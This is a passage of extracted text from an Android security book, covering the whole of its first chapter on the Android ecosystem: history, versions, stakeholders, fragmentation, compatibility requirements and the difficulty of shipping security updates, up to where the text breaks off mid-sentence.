through\nAndroid security. We hope reading this book will give you a deeper knowledge\nand better understanding of the technologies, concepts, tools, techniques, and\nvulnerabilities of Android devices. Through your newly acquired wisdom, you\nwill be on the path to improving Android’s overall security posture. Join us in\nmaking Android more secure, and don’t forget to have fun doing it!\nfl ast.indd 01:24:53:PM 02/24/2014 Page xxix\nfl ast.indd 01:24:53:PM 02/24/2014 Page xxx\nCHAPTER\n1\nLooking at the Ecosystem\nThe word Android is used correctly in many contexts. Although the word still\ncan refer to a humanoid robot, Android has come to mean much more than\nthat in the last decade. In the mobile space, it refers to a company, an operating\nsystem, an open source project, and a development community. Some people\neven call mobile devices Androids. In short, an entire ecosystem surrounds the\nnow wildly popular mobile operating system.\nThis chapter looks closely at the composition and health of the Android\necosystem. First you fi nd out how Android became what it is today. Then the\nchapter breaks down the ecosystem stakeholders into groups in order to help\nyou understand their roles and motivations. Finally, the chapter discusses the\ncomplex relationships within the ecosystem that give rise to several important\nissues that affect security.\nUnderstanding Android’s Roots\nAndroid did not become the world’s most popular mobile operating system\novernight. The last decade has been a long journey with many bumps in the\nroad. This section recounts how Android became what it is today and begins\nlooking at what makes the Android ecosystem tick.\n1\nc01.indd 01:14:5:PM 02/24/2014 Page 1\n2 Chapter 1 ■ Looking at the Ecosystem\nCompany History\nAndroid began as Android, Inc., a company founded by Andy Rubin, Chris\nWhite, Nick Sears, and Rich Miner in October 2003. They focused on creating\nmobile devices that were able to take into account location information and\nuser preferences. After successfully navigating market demand and fi nancial\ndiffi culties, Google acquired Android, Inc., in August 2005. During the period\nfollowing, Google began building partnerships with hardware, software, and\ntelecommunications companies with the intent of entering the mobile market.\nIn November 2007, the Open Handset Alliance (OHA) was announced. This\nconsortium of companies, which included 34 founding members led by Google,\nshares a commitment to openness. In addition, it aims to accelerate mobile plat-\nform innovation and offer consumers a richer, less expensive, and better mobile\nexperience. The OHA has since grown to 84 members at the time this book was\npublished. Members represent all parts of the mobile ecosystem, including\nmobile operators, handset manufacturers, semiconductor companies, software\ncompanies, and more. You can fi nd the full list of members on the OHA website\nat www.openhandsetalliance.com/oha_members.html.\nWith the OHA in place, Google announced its fi rst mobile product, Android.\nHowever, Google still did not bring any devices running Android to the market.\nFinally, after a total of fi ve years, Android was made available to the general\npublic in October 2008. The release of the fi rst publicly available Android phone,\nthe HTC G1, marked the beginning of an era.\nVersion History\nBefore the fi rst commercial version of Android, the operating system had Alpha\nand Beta releases. The Alpha releases where available only to Google and OHA\nmembers, and they were codenamed after popular robots Astro Boy, Bender, and\nR2-D2. Android Beta was released on November 5, 2007, which is the date that\nis popularly considered the Android birthday.\nThe fi rst commercial version, version 1.0, was released on September 23, 2008,\nand the next release, version 1.1, was available on February 9, 2009. Those were\nthe only two releases that did not have a naming convention for their codename.\nStarting with Android 1.5, which was released on April 30, 2009, the major ver-\nsions’ code names were ordered alphabetically with the names of tasty treats.\nVersion 1.5 was code named Cupcake. Figure 1-1 shows all commercial Android\nversions, with their respective release dates and code names.\nc01.indd 01:14:5:PM 02/24/2014 Page 2\nChapter 1 ■ Looking at the Ecosystem 3\nFigure 1-1: Android releases\nc01.indd 01:14:5:PM 02/24/2014 Page 3\n4 Chapter 1 ■ Looking at the Ecosystem\nIn the same way that Android releases are code-named, individual builds are\nidentifi ed with a short build code, as explained on the Code Names, Tags, and\nBuild Numbers page at http://source.android.com/source/build-numbers\n.html. For example, take the build number JOP40D. The fi rst letter represents the\ncode name of the Android release (J is Jelly Bean). The second letter identifi es\nthe code branch from which the build was made, though its precise meaning\nvaries from one build to the next. The third letter and subsequent two digits\ncomprise a date code. The letter represents the quarter, starting from A, which\nmeans the fi rst quarter of 2009. In the example, P represents the fourth quarter\nof 2012. The two digits signify days from the start of the quarter. In the example,\nP40 is November 10, 2012. The fi nal letter differentiates individual versions\nfor the same date, again starting with A. The fi rst builds for a particular date,\nsignifi ed with A, don’t usually use this letter.\nExamining the Device Pool\nAs Android has grown, so has the number of devices based on the operating\nsystem. In the past few years, Android has been slowly branching out from the\ntypical smartphone and tablet market, fi nding its way into the most unlikely\nof places. Devices such as smart watches, television accessories, game consoles,\novens, satellites sent to space, and the new Google Glass (a wearable device with\na head-mounted display) are powered by Android. The automotive industry is\nbeginning to use Android as an infotainment platform in vehicles. The operat-\ning system is also beginning to make a strong foothold in the embedded Linux\nspace as an appealing alternative for embedded developers. All of these facts\nmake the Android device pool an extremely diverse place.\nYou can obtain Android devices from many retail outlets worldwide. Currently,\nmost mobile subscribers get subsidized devices through their mobile carriers.\nCarriers provide these subsidies under the terms of a contract for voice and\ndata services. Those who do not want to be tied to a carrier can also purchase\nAndroid devices in consumer electronics stores or online. In some countries,\nGoogle sells their Nexus line of Android devices in their online store, Google Play.\nGoogle Nexus\nNexus devices are Google’s fl agship line of devices, consisting mostly of smart-\nphones and tablets. Each device is produced by a different original equipment\nmanufacturer (OEM) in a close partnership with Google. They are sold SIM-\nunlocked, which makes switching carriers and traveling easy, through Google\nPlay directly by Google. To date, Google has worked in cooperation with HTC,\nc01.indd 01:14:5:PM 02/24/2014 Page 4\nChapter 1 ■ Looking at the Ecosystem 5\nSamsung, LG, and ASUS to create Nexus smartphones and tablets. Figure 1-2\nshows some of the Nexus devices released in recent years.\nFigure 1-2: Google Nexus devices\nNexus devices are meant to be the reference platform for new Android\nversions. As such, Nexus devices are updated directly by Google soon after\na new Android version is released. These devices serve as an open platform\nfor developers. They have unlockable boot loaders that allow fl ashing custom\nAndroid builds and are supported by the Android Open Source Project (AOSP).\nGoogle also provides factory images, which are binary fi rmware images that can\nbe fl ashed to return the device to the original, unmodifi ed state.\nAnother benefi t of Nexus devices is that they offer what is commonly referred\nto as a pure Google experience. This means that the user interface has not been\nmodifi ed. Instead, these devices offer the stock interface found in vanilla Android\nas compiled from AOSP. This also includes Google’s proprietary apps such as\nGoogle Now, Gmail, Google Play, Google Drive, Hangouts, and more.\nMarket Share\nSmartphone market share statistics vary from one source to another. Some\nsources include ComScore, Kantar, IDC, and Strategy Analytics. An over-\nall look at the data from these sources shows that Android’s market share is\non the rise in a large proportion of countries. According to a report released\nby Goldman Sachs, Android was the number one player in the entire global\ncomputing market at the end of 2012. StatCounter’s GlobalStats, available at\nhttp://gs.statcounter.com/, show that Android is currently the number one\nplayer in the mobile operating system market, with 41.3 percent worldwide as\nc01.indd 01:14:5:PM 02/24/2014 Page 5\n6 Chapter 1 ■ Looking at the Ecosystem\nof November 2013. Despite these small variations, all sources seem to agree that\nAndroid is the dominating mobile operating system.\nRelease Adoption\nNot all Android devices run the same Android version. Google regularly pub-\nlishes a dashboard showing the relative percentage of devices running a given\nversion of Android. This information is based on statistics gathered from visits\nto Google Play, which is present on all approved devices. The most up-to-date\nversion of this dashboard is available at http://developer.android.com/about/\ndashboards/. Additionally, Wikipedia contains a chart showing dashboard\ndata aggregated over time. Figure 1-3 depicts the chart as of this writing, which\nincludes data from December 2009 to February 2013.\nFigure 1-3: Android historical version distribution\nSource: fjmustak (Creative Commons Attribution-Share Alike 3.0 Unported license) http://\nen.wikipedia.org/wiki/File:Android_historical_version_\ndistribution.png\nAs shown, new versions of Android have a relatively slow adoption rate. It\ntakes in excess of one year to get a new version running on 90 percent of devices.\nYou can read more about this issue and other challenges facing Android in the\n“Grasping Ecosystem Complexities” section later in this chapter.\nc01.indd 01:14:5:PM 02/24/2014 Page 6\nChapter 1 ■ Looking at the Ecosystem 7\nOpen Source, Mostly\nAOSP is the manifestation of Google and the OHA members’ commitment to\nopenness. At its foundation, the Android operating system is built upon many\ndifferent open source components. This includes numerous libraries, the Linux\nkernel, a complete user interface, applications, and more. All of these software\ncomponents have an Open Source Initiative (OSI)–approved license. Most of the\nAndroid source is released under version 2.0 of the Apache Software License\nthat you can fi nd at apache.org/licenses/LICENSE-2.0. Some outliers do exist,\nmainly consisting on upstream projects, which are external open source projects\non which Android depends. Two examples are the Linux kernel code that is\nlicensed under GPLv2 and the WebKit project that uses a BSD-style license.\nThe AOSP source repository brings all of these projects together in one place.\nAlthough the vast majority of the Android stack is open source, the resulting\nconsumer devices contain several closed source software components. Even\ndevices from Google’s fl agship Nexus line contain code that ships as propri-\netary binary blobs. Examples include boot loaders, peripheral fi rmware, radio\ncomponents, digital rights management (DRM) software, and applications.\nMany of these remain closed source in an effort to protect intellectual property.\nHowever, keeping them closed source hinders interoperability, making com-\nmunity porting efforts more challenging.\nFurther, many open source enthusiasts trying to work with the code fi nd that\nAndroid isn’t fully developed in the open. Evidence shows that Google develops\nAndroid largely in secret. Code changes are not made available to the public\nimmediately after they are made. Instead, open source releases accompany new\nversion releases. Unfortunately, several times the open source code was not made\navailable at release time. In fact, the source code for Android Honeycomb (3.0)\nwas not made available until the source code for Ice Cream Sandwich (4.0) was\nreleased. In turn, the Ice Cream Sandwich source code wasn’t released until\nalmost a month after the offi cial release date. Events like these detract from\nthe spirit of open source software, which goes against two of Android’s stated\ngoals: innovation and openness.\nUnderstanding Android Stakeholders\nUnderstanding exactly who has a stake in the Android ecosystem is important.\nNot only does it provide perspective, but it also allows one to understand who\nis responsible for developing the code that supports various components. This\nsection walks through the main groups of stakeholders involved, including\nGoogle, hardware vendors, carriers, developers, users, and security researchers.\nc01.indd 01:14:5:PM 02/24/2014 Page 7\n8 Chapter 1 ■ Looking at the Ecosystem\nThis section explores each stakeholder’s purpose and motivations, and it exam-\nines how the stakeholders relate to each other.\nEach group is from a different fi eld of industry and serves a particular pur-\npose in the ecosystem. Google, having given birth to Android, develops the\ncore operating system and manages the Android brand. Hardware fabricators\nmake the underlying hardware components and peripherals. OEMs make the\nend-user devices and manage the integration of the various components that\nmake a device work. Carriers provide voice and data access for mobile devices. A\nvast pool of developers, including those who are employed by members of other\ngroups, work on a multitude of projects that come together to form Android.\nFigure 1-4 shows the relationships between the main groups of ecosystem\nstakeholders.\nGoogle All levels\nSystem-on-Chip\nKernel, Radio\nManufacturers\nOEMs All levels\nApps, boot loader\nCarriers\nand radio reqs\nConsumers\nFigure 1-4: Ecosystem relationships\nThese relationships indicate who talks to who when creating or updating\nan Android device. As the fi gure clearly shows, the Android ecosystem is very\ncomplex. Such business relationships are diffi cult to manage and lead to a variety\nof complexities that are covered later in this chapter. Before getting into those\nissues, it’s time to discuss each group in more detail.\nGoogle\nAs the company that brought Android to market, Google has several key\nroles in the ecosystem. Its responsibilities include legal administration, brand\nc01.indd 01:14:5:PM 02/24/2014 Page 8\nChapter 1 ■ Looking at the Ecosystem 9\nmanagement, infrastructure management, in-house development, and enabling\noutside development. Also, Google builds its line of Nexus devices in close\ncooperation with its partners. In doing so, it strikes the business deals necessary\nto make sure that great devices running Android actually make it to market.\nGoogle’s ability to execute on all of these tasks well is what makes Android\nappealing to consumers.\nFirst and foremost, Google owns and manages the Android brand. OEMs can-\nnot legally brand their devices as Android devices or provide access to Google\nPlay unless the devices meet Google’s compatibility requirements. (The details\nof these requirements are covered in more depth in the “Compatibility” section\nlater in this chapter.) Because Android is open source, compatibility enforce-\nment is one of the few ways that Google can infl uence what other stakeholders\ncan do with Android. Without it, Google would be largely powerless to prevent\nthe Android brand from being tarnished by a haphazard or malicious partner.\nThe next role of Google relates to the software and hardware infrastructure\nneeded to support Android devices. Services that support apps such as Gmail,\nCalendar, Contacts, and more are all run by Google. Also, Google runs Google\nPlay, which includes rich media content delivery in the form of books, maga-\nzines, movies, and music. Delivering such content requires licensing agreements\nwith distribution companies all over the world. Additionally, Google runs the\nphysical servers behind these services in their own data centers, and the com-\npany provides several crucial services to the AOSP, such as hosting the AOSP\nsources, factory image downloads, binary driver downloads, an issue tracker,\nand the Gerrit code review tool.\nGoogle oversees the development of the core Android platform. Internally, it\ntreats the Android project as a full-scale product development operation. The\nsoftware developed inside Google includes the operating system core, a suite\nof core apps, and several optional non-core apps. As mentioned previously,\nGoogle develops innovations and enhancements for future Android versions in\nsecret. Google engineers use an internal development tree that is not visible to\ndevice manufacturers, carriers, or third-party developers. When Google decides\nits software is ready for release, it publishes factory images, source code, and\napplication programming interface (API) documentation simultaneously. It also\npushes updates out via over-the-air (OTA) distribution channels. After a release\nis in AOSP, everyone can clone it and start their work building their version of\nthe latest release. Separating development in this fashion enables developers\nand device manufacturers to focus on a single version without having to track\nthe unfi nished work of Google’s internal teams. As true as this may be, closed\ndevelopment detracts from the credence of AOSP as an open source project.\nYet another role for Google lies in fostering an open development community\nthat uses Android as a platform. Google provides third-party developers with\nc01.indd 01:14:5:PM 02/24/2014 Page 9\n10 Chapter 1 ■ Looking at the Ecosystem\ndevelopment kits, API documentation, source code, style guidance, and more.\nAll of these efforts help create a cohesive and consistent experience across mul-\ntiple third-party applications.\nBy fulfi lling these roles, Google ensures the vitality of the Android as a brand,\na platform, and an open source project.\nHardware Vendors\nThe purpose of an operating system is to provide services to applications and\nmanage hardware connected to the device. After all, without hardware the\nAndroid operating system software wouldn’t serve much purpose. The hardware\nof today’s smartphones is very complex. With such a small form factor and lots\nof peripherals, supporting the necessary hardware is quite an undertaking. In\norder to take a closer look at the stakeholders in this group, the following sec-\ntions break down hardware vendors into three subgroups that manufacture\ncentral processing units (CPUs), System-on-Chip (SoC), and devices, respectively.\nCPU Manufacturers\nAlthough Android applications are processor agnostic, native binaries are\nnot. Instead, native binaries are compiled for the specifi c processor used by a\nparticular device. Android is based on the Linux kernel, which is portable and\nsupports a multitude of processor architectures. Similarly, Android’s Native\nDevelopment Kit (NDK) includes tools for developing user-space native code\nfor all application processor architectures supported by Android. This includes\nARM, Intel x86, and MIPS.\nDue to its low power consumption, the ARM architecture has become the\nmost widely used architecture in mobile devices. Unlike other microprocessor\ncorporations that manufacture their own CPUs, ARM Holdings only licenses\nits technology as intellectual property. ARM offers several microprocessor core\ndesigns, including the ARM11, Cortex-A8, Cortex-A9, and Cortex-A15. The designs\nusually found on Android devices today feature the ARMv7 instruction set.\nIn 2011, Intel and Google announced a partnership to provide support for\nIntel processors in Android. The Medfi eld platform, which features an Atom\nprocessor, was the fi rst Intel-based platform supported by Android. Also, Intel\nlaunched the Android on Intel Architecture (Android-IA) project. This project is\nbased on AOSP and provides code for enabling Android on Intel processors. The\nAndroid-IA website at https://01.org/android-ia/ is targeted at system and\nplatform developers whereas the Intel Android Developer website at http://\nsoftware.intel.com/en-us/android/ is targeted at application developers.\nSome Intel-based smartphones currently on the market include an Intel pro-\nprietary binary translator named libhoudini. This translator allows running\napplications built for ARM processors on Intel-based devices.\nc01.indd 01:14:5:PM 02/24/2014 Page 10\nChapter 1 ■ Looking at the Ecosystem 11\nMIPS Technologies offers licenses to its MIPS architecture and microprocessor\ncore designs. In 2009, MIPS Technologies ported Google’s Android operating\nsystem to the MIPS processor architecture. Since then, several device manu-\nfacturers have launched Android devices running on MIPS processors. This is\nespecially true for set-top boxes, media players, and tablets. MIPS Technologies\noffers source code for its Android port, as well as other development resources,\nat http://www.imgtec.com/mips/developers/mips-android.asp.\nSystem-on-Chip Manufacturers\nSystem-on-Chip (SoC) is the name given to a single piece of silicon that includes\nthe CPU core, along with a graphics processing unit (GPU), random access\nmemory (RAM), input/output (I/O) logic, and sometimes more. For example,\nmany SoCs used in smartphones include a baseband processor. Currently, most\nSoCs used in the mobile industry include more than one CPU core. Combining\nthe components on a single chip reduces manufacturing costs and decreases\npower consumption, ultimately leading to smaller and more effi cient devices.\nAs mentioned previously, ARM-based devices dominate the Android device\npool. Within ARM devices, there are four main SoC families in use: OMAP from\nTexas Instruments, Tegra from nVidia, Exynos from Samsung, and Snapdragon\nfrom Qualcomm. These SoC manufacturers license the CPU core design from\nARM Holdings. You can fi nd a full list of licensees on ARM’s website at www.arm.\ncom/products/processors/licensees.php. With the exception of Qualcomm,\nSoC manufacturers use ARM’s designs without modifi cation. Qualcomm invests\nadditional effort to optimize for lower power consumption, higher performance,\nand better heat dissipation.\nEach SoC has different components integrated into it and therefore requires\ndifferent support in the Linux kernel. As a result, development for each SoC is\ntracked separately in a Git repository specifi c to that SoC. Each tree includes\nSoC-specifi c code including drivers and confi gurations. On several occasions,\nthis separation has led to vulnerabilities being introduced into only a subset\nof the SoC-specifi c kernel source repositories. This situation contributes to\none of the key complexities in the Android ecosystem, which is discussed\nfurther in the “Grasping Ecosystem Complexities” section later in this chapter.\nDevice Manufacturers\nDevice manufacturers, including original design manufacturers (ODMs) and\nOEMs, design and build the products used by consumers. They decide which\ncombination of hardware and software will make it into the fi nal unit and take\ncare of all of the necessary integration. They choose the hardware components\nthat will be combined together, the device form factor, screen size, materials,\nbattery, camera lens, sensors, radios, and so on. Usually device manufacturers\nc01.indd 01:14:5:PM 02/24/2014 Page 11\n12 Chapter 1 ■ Looking at the Ecosystem\npartner up with a SoC manufacturer for a whole line of products. Most choices\nmade when creating a new device relate directly to market differentiation,\ntargeting a particular customer segment, or building brand loyalty.\nWhile developing new products, device manufacturers have to adapt the\nAndroid platform to work well on its new hardware. This task includes adding\nnew kernel device drivers, proprietary bits, and user-space libraries. Further,\nOEMs often make custom modifi cations to Android, especially in the Android\nFramework. To comply with the GPLv2 license of the Android kernel, OEMs are\nforced to release kernel sources. However, the Android Framework is licensed\nunder the Apache 2.0 License, which allows modifi cations to be redistributed\nin binary form without having to release the source code. This is where most\nvendors try to put their innovations to differentiate their devices from others. For\nexample, the Sense and Touchwiz user interface modifi cations made by HTC and\nSamsung are implemented primarily in the Android Framework. Such modi-\nfi cations are a point of contention because they contribute to several complex,\nsecurity-related problems in the ecosystem. For example, customizations may\nintroduce new security issues. You can read more about these complexities in\nthe “Grasping Ecosystem Complexities” section, later in this chapter.\nCarriers\nAside from providing mobile voice and data services, carriers close deals with\ndevice manufacturers to subsidize phones to their clients. The phones obtained\nthrough a carrier usually have a carrier-customized software build. These builds\ntend to have the carrier logo in the boot screen, preconfi gured Access Point Name\n(APN) network settings, changes in the default browser home page and browser\nbookmarks, and a lot of pre-loaded applications. Most of the time these changes\nare embedded into the system partition so that they cannot be removed easily.\nIn addition to adding customization to the device’s fi rmware, carriers also have\ntheir own quality assurance (QA) testing procedures in place. These QA processes\nare reported to be lengthy and contribute to the slow uptake of software updates.\nIt is very common to see an OEM patch a security hole in the operating system\nfor its unbranded device while the carrier-branded device remains vulnerable\nfor much longer. It’s not until the update is ready to be distributed to the car-\nrier devices that subsidized users are updated. After they have been available\nfor some time, usually around 12 to 18 months, devices are discontinued. Some\ndevices are discontinued much more quickly—in a few cases even immediately\nafter release. After that point, any users still using such a device will no longer\nreceive updates, regardless of whether they are security related or not.\nc01.indd 01:14:5:PM 02/24/2014 Page 12\nChapter 1 ■ Looking at the Ecosystem 13\nDevelopers\nAs an open source operating system, Android is an ideal platform for\ndevelopers to play with. Google engineers are not the only people contributing\ncode to the Android platform. There are a lot of individual developers and enti-\nties who contribute to AOSP on their own behalf. Every contribution to AOSP\n(coming either from Google or from a third party) has to use the same code style\nand be processed through Google’s source code review system, Gerrit. During\nthe code review process, someone from Google decides whether to include or\nexclude the changes.\nNot all developers in the Android ecosystem build components for the operat-\ning system itself. A huge portion of developers in the ecosystem are application\ndevelopers. They use the provided software development kits (SDKs), frameworks,\nand APIs to build apps that enable end users to achieve their goals. Whether\nthese goals are productivity, entertainment, or otherwise, app developers aim\nto meet the needs of their user base.\nIn the end, developers are driven by popularity, reputation, and proceeds.\nApp markets in the Android ecosystem offer developers incentives in the form of\nrevenue sharing. For example, advertisement networks pay developers for plac-\ning ads in their applications. In order to maximize their profi ts, app developers\ntry to become extremely popular while maintaining an upstanding reputation.\nHaving a good reputation, in turn, drives increased popularity.\nCustom ROMs\nThe same way manufacturers introduce their own modifi cations to the Android\nplatform, there are other custom fi rmware projects (typically called ROMs) devel-\noped by communities of enthusiasts around the world. One of the most popular\nAndroid custom fi rmware projects is CyanogenMod. With 9.5 million active installs\nin December 2013, it is developed based on the offi cial releases of Android with\nadditional original and third-party code. These community-modifi ed versions of\nAndroid usually include performance tweaks, interface enhancements, features,\nand options that are typically not found in the offi cial fi rmware distributed with\nthe device. Unfortunately, they often undergo less extensive testing and quality\nassurance. Further, similar to the situation with OEMs, modifi cations made in\ncustom ROMs may introduce additional security issues.\nHistorically, device manufacturers and mobile carriers have been unsup-\nportive of third-party fi rmware development. To prevent users from using\ncustom ROMs, they place technical obstacles such as locked boot loaders or\nc01.indd 01:14:5:PM 02/24/2014 Page 13\n14 Chapter 1 ■ Looking at the Ecosystem\nNAND locks. However, custom ROMs have grown more popular because\nthey provide continued support for older devices that no longer receive offi cial\nupdates. Because of this, manufacturers and carriers have softened their posi-\ntions regarding unoffi cial fi rmware. Over time, some have started shipping\ndevices with unlocked or unlockable boot loaders, similar to Nexus devices.\nUsers\nAndroid would not be the thriving community that it is today without its mas-\nsive user base. Although each individual user has unique needs and desires,\nthey can be classifi ed into one of three categories. The three types of end users\ninclude general consumers, power users, and security researchers.\nConsumers\nSince Android is the top-selling smartphone platform, end users enjoy a wide\nrange of devices to choose from. Consumers want a single, multifunction device\nwith personal digital assistant (PDA) functions, camera, global position system\n(GPS) navigation, Internet access, music player, e-book reader, and a complete\ngaming platform. Consumers usually look for a productivity boost, to stay\norganized, or stay in touch with people in their lives, to play games on the go\nand to access information from various sources on the Internet. On top of all\nthis, they expect a reasonable level of security and privacy.\nThe openness and fl exibility of Android is also apparent to consumers. The\nsheer number of available applications, including those installable from sources\noutside offi cial means, is directly attributable to the open development com-\nmunity. Further, consumers can extensively customize their devices by install-\ning third-party launchers, home screen widgets, new input methods, or even\nfull custom ROMs. Such fl exibility and openness is often the deciding factor\nfor those who choose Android over competing smartphone operating systems.\nPower Users\nThe second type of user is a special type of consumer called power users in this\ntext. Power users want to have the ability to use features that are beyond what\nis enabled in stock devices. For example, users who want to enable Wi-Fi teth-\nering on their devices are considered members of this group. These users are\nintimately familiar with advanced settings and know the limitations of their\ndevices. They are much less averse to the risk of making unoffi cial changes to\nthe Android operating system, including running publicly available exploits to\ngain elevated access to their devices.\nc01.indd 01:14:5:PM 02/24/2014 Page 14\nChapter 1 ■ Looking at the Ecosystem 15\nSecurity Researchers\nYou can consider security researchers a subset of power users, but they have\nadditional requirements and differing goals. These users can be motivated by\nfame, fortune, knowledge, openness, protecting systems, or some combination\nof these ideals. Regardless of their motivations, security researchers aim to\ndiscover previously unknown vulnerabilities in Android. Conducting this type\nof research is far easier when full access to a device is available. When elevated\naccess is not available, researchers usually seek to obtain elevated access fi rst.\nEven with full access, this type of work is challenging.\nAchieving the goals of a security researcher requires deep technical knowl-\nedge. Being a successful security researcher requires a solid understanding of\nprogramming languages, operating system internals, and security concepts.\nMost researchers are competent in developing, reading, and writing several dif-\nferent programming languages. In some ways, thi s makes security researchers\nmembers of the developers group, too. It’s common for security researchers to\nstudy security concepts and operating system internals at great length, includ-\ning staying on top of cutting edge information.\nThe security researcher ecosystem group is the primary target audience of\nthis book, which has a goal of both providing base knowledge for budding\nresearchers and furthering the knowledge of established researchers.\nGrasping Ecosystem Complexities\nThe OHA includes pretty much all major Android vendors, but some parties\nare working with different goals. Some of these goals are competing. This leads\nto various partnerships between manufacturers and gives rise to some massive\ncross-organizational bureaucracy. For example, Samsung memory division is\none of the world’s largest manufacturers of NAND fl ash. With around 40 percent\nmarket share, Samsung produces dynamic random access memory (DRAM)\nand NAND memory even for devices made by competitors of its mobile phones\ndivision. Another controversy is that although Google does not directly earn\nanything from the sale of each Android device, Microsoft and Apple have\nsuccessfully sued Android handset manufacturers to extract patent royalty\npayments from them. Still, this is not the full extent of the complexities that\nplague the Android ecosystem.\nApart from legal battles and diffi cult partnerships, the Android ecosystem\nis challenged by several other serious problems. Fragmentation in both hard-\nware and software causes complications, only some of which are addressed by\nGoogle’s compatibility standards. Updating the Android operating system itself\nc01.indd 01:14:5:PM 02/24/2014 Page 15\n16 Chapter 1 ■ Looking at the Ecosystem\nremains a signifi cant challenge for all of the ecosystem stakeholders. Strong\nroots in open source further complicate software update issues, giving rise to\nincreased exposure to known vulnerabilities. Members of the security research\ncommunity are troubled with the dilemma of deciding between security and\nopenness. This dilemma extends to other stakeholders as well, leading to a\nterrible disclosure track record. The following sections discuss each of these\nproblem areas in further detail.\nFragmentation\nThe Android ecosystem is rampant with fragmentation, due to the differences\nbetween the multitudes of various Android devices. The open nature of Android\nmakes it ideal for mobile device manufacturers to build their own devices based\noff the platform. As a result, the device pool is made up of many different devices\nfrom many different manufacturers. Each device is composed of a variety of\nsoftware and hardware, including OEM or carrier-specifi c modifi cations. Even\non the same device, the version of Android itself might vary from one carrier\nor user to another. Because of all of these differences, consumers, developers,\nand security researchers wrestle with fragmentation regularly.\nAlthough fragmentation has relatively little effect on consumers, it is slightly\ndamaging to the Android brand. Consumers accustomed to using Samsung\ndevices who switch to a device from HTC are often met with a jarring experi-\nence. Because Samsung and HTC both highly customize the user experience\nof their devices, users have to spend some time reacquainting themselves with\nhow to use their new devices. The same is also true for longtime Nexus device\nusers who switch to OEM-branded devices. Over time, consumers may grow\ntired of this issue and decide to switch to a more homogeneous platform. Still,\nthis facet of fragmentation is relatively minor.\nApplication developers are signifi cantly more affected by fragmentation\nthan consumers. Issues primarily arise when developers attempt to support\nthe variety of devices in the device pool (including the software that runs on\nthem). Testing against all devices is very expensive and time intensive. Although\nusing the emulator can help, it’s not a true representation of what users on actual\ndevices will encounter. The issues developers must deal with include differing\nhardware confi gurations, API levels, screen sizes, and peripheral availability.\nSamsung has more than 15 different screen sizes for its Android devices, ranging\nfrom 2.6 inches to 10.1 inches. Further, High-Defi nition Multimedia Interface\n(HDMI) dongles and Google TV devices that don’t have a touchscreen require\nspecialized input handling and user interface (UI) design. Dealing with all of\nthis fragmentation is no easy task, but thankfully Google provides developers\nwith some facilities for doing so.\nc01.indd 01:14:5:PM 02/24/2014 Page 16\nChapter 1 ■ Looking at the Ecosystem 17\nDevelopers create applications that perform well across different devices, in\npart, by doing their best to hide fragmentation issues. To deal with differing\nscreen sizes, the Android UI framework allows applications to query the device\nscreen size. When an app is designed properly, Android automatically adjusts\napplication assets and UI layouts appropriately for the device. Google Play also\nallows app developers to deal with differing hardware confi gurations by declar-\ning requirements within the application itself. A good example is an application\nthat requires a touchscreen. On a device without a touchscreen, viewing such an\napp on Google Play shows that the app does not support the device and cannot\nbe installed. The Android application Support Library transparently deals with\nsome API-level differences. However, despite all of the resources available, some\ncompatibility issues remain. Developers are left to do their best in these corner\ncases, often leading to frustration. Again, this weakens the Android ecosystem\nin the form of developer disdain.\nFor security, fragmentation is both positive and negative, depending mostly on\nwhether you take the perspective of an attacker or a defender. Although attack-\ners might easily fi nd exploitable issues on a particular device, those issues are\nunlikely to apply to devices from a different manufacturer. This makes fi nding\nfl aws that affect a large portion of the ecosystem diffi cult. Even when equipped\nwith such a fl aw, variances across devices complicate exploit development. In\nmany cases, developing a universal exploit (one that works across all Android\nversions and all devices) is not possible. For security researchers, a comprehen-\nsive audit would require reviewing not only every device ever made, but also\nevery revision of software available for those devices. Quite simply put, this is an\ninsurmountable task. Focusing on a single device, although more approachable,\ndoes not paint an adequate picture of the entire ecosystem. An attack surface\npresent on one device might not be present on another. Also, some components\nare more diffi cult to audit, such as closed source software that is specifi c to each\ndevice. Due to these challenges, fragmentation simultaneously makes the job\nof an auditor more diffi cult and helps prevent large-scale security incidents.\nCompatibility\nOne complexity faced by device manufacturers is compatibility. Google, as\nthe originator of Android, is charged with protecting the Android brand. This\nincludes preventing fragmentation and ensuring that consumer devices are\ncompatible with Google’s vision. To ensure device manufacturers comply with\nthe hardware and software compatibility requirements set by Google, the com-\npany publishes a compatibility document and a test suite. All manufacturers\nwho want to distribute devices under the Android brand have to follow these\nguidelines.\nc01.indd 01:14:5:PM 02/24/2014 Page 17\n18 Chapter 1 ■ Looking at the Ecosystem\nCompatibility Defi nition Document\nThe Android Compatibility Defi nition Document (CDD) available at http://source\n.android.com/compatibility/ enumerates the software and hardware require-\nments of a “compatible” Android device. Some hardware must be present on\nall Android devices. For example, the CDD for Android 4.2 specifi es that all\ndevice implementations must include at least one form of audio output, and\none or more forms of data networking capable of transmitting data at 200K\nbit/s or greater. However, the inclusion of various peripherals is left up to the\ndevice manufacturer. If certain peripherals are included, the CDD specifi es\nsome additional requirements. For example, if the device manufacturer decides\nto include a rear-facing camera, then the camera must have a resolution of at\nleast 2 megapixels. Devices must follow CDD requirements to bear the Android\nmoniker and, further, to ship with Google’s applications and services.\nCompatibility Test Suite\nThe Android Compatibility Test Suite (CTS) is an automated testing harness that\nexecutes unit tests from a desktop computer to the attached mobile devices.\nCTS tests are designed to be integrated into continuous build systems of the\nengineers building a Google-certifi ed Android device. Its intent is to reveal\nincompatibilities early on, and ensure that the software remains compatible\nthroughout the development process.\nAs previously mentioned, OEMs tend to heavily modify parts of the Android\nFramework. The CTS makes sure that APIs for a given version of the platform\nare unmodifi ed, even after vendor modifi cations. This ensures that applica-\ntion developers have a consistent development experience regardless of who\nproduced the device.\nThe tests performed in the CTS are open source and continually evolving.\nSince May 2011, the CTS has included a test category called security that cen-\ntralizes tests for security bugs. You can review the current security tests in the\nmaster branch of AOSP at https://android.googlesource.com/platform/\ncts/+/master/tests/tests/security.\nUpdate Issues\nUnequivocally, the most important complexity in the Android ecosystem relates\nto the handling of software updates, especially security fi xes. This issue is fueled\nby several other complexities in the ecosystem, including third-party software,\nOEM customizations, carrier involvement, disparate code ownership, and more.\nProblems keeping up with upstream open source projects, technical issues with\ndeploying operating system updates, lack of back-porting, and a defunct alliance\nc01.indd 01:14:5:PM 02/24/2014 Page 18\nChapter 1 ■ Looking at the Ecosystem 19\nare at the heart of the matter. Overall, this is the single largest factor contribut-\ning to the large number of insecure devices in use in the Android ecosystem.\nUpdate Mechanisms\nThe root cause of this issue stems from the divergent processes involved in\nupdating software in Android. Updates for apps are handled differently than\noperating system updates. An app developer can deploy a patch for a security\nfl aw in his app via Google Play. This is true whether 